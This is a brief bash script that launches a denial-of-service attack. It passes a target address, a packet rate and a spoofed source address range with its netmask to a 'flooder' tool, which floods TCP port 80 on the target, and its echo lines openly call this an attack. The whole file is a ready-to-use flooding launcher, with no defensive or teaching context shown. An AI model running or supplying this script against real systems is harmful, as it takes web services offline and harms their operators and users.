#!/bin/bash

echo "Start flooding $1 with $2 packets evert second"
echo "Address used for the attack: $3 with netmask: $4"
flooder --dst $1 --highrate $2 --proto 6 --dportmin 80 --dportmax 80 --src $3 --srcmask $4
